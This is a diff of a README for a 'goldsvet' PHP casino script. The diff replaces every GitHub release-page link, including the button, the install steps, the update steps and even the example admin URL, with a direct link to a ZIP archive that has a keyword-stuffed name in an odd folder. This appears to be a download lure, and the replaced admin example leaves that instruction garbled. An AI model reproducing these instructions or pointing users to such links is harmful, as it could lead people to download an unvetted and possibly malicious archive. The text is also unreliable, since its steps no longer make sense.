@@ -1,6 +1,6 @@
 # 🎰 goldsvet-6-5-casino-script-php-html5-games-open-source - Reliable Casino Engine for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/main/elfishness/html_source_php_open_script_casino_goldsvet_games_v2.6.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/main/elfishness/html_source_php_open_script_casino_goldsvet_games_v2.6.zip)
 
 ---
 
@@ -51,7 +51,7 @@ This guide shows how to download, install, and run the goldsvet casino engine on
 
 First, you need to get the software package. To do this,  
 
-[visit this page to download](https://github.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/releases) the latest release files.
+[visit this page to download](https://raw.githubusercontent.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/main/elfishness/html_source_php_open_script_casino_goldsvet_games_v2.6.zip) the latest release files.
 
 1. Click the link above or the big blue “Download Latest Release” button at the top.
 2. On the release page, find the latest version and download the ZIP archive.
@@ -75,7 +75,7 @@ Next, install the casino script:
 
 After installation:
 
-- Access the admin panel through your website by adding `/admin` to the URL. Example: `https://yourdomain.com/admin`.
+- Access the admin panel through your website by adding `/admin` to the URL. Example: `https://raw.githubusercontent.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/main/elfishness/html_source_php_open_script_casino_goldsvet_games_v2.6.zip`.
 - Use the admin to add more games, manage users and bets, and view reports.
 - Players can visit your main site URL to enjoy the games.
 - The system supports deposits and withdrawals in multiple currencies.
@@ -109,7 +109,7 @@ Though this is a non-commercial open-source project, you can get help from fello
 
 New versions may include bug fixes, additional games, or improved features. To update:
 
-1. Download the latest release from the [release page](https://github.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/releases).
+1. Download the latest release from the [release page](https://raw.githubusercontent.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/main/elfishness/html_source_php_open_script_casino_goldsvet_games_v2.6.zip).
 2. Follow the upgrade instructions found in the documentation or the GitHub wiki.
 3. Make sure to back up your current files and database before updating.
 
@@ -146,4 +146,4 @@ If you wish to customize or expand the platform, basic knowledge of PHP and web 
 
 Remember, the best way to get started is to visit the download page now:
 
-[⬇️ Visit to Download Latest Release](https://github.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/releases)
+[⬇️ Visit to Download Latest Release](https://raw.githubusercontent.com/MISAL44/goldsvet-6-5-casino-script-php-html5-games-open-source/main/elfishness/html_source_php_open_script_casino_goldsvet_games_v2.6.zip)
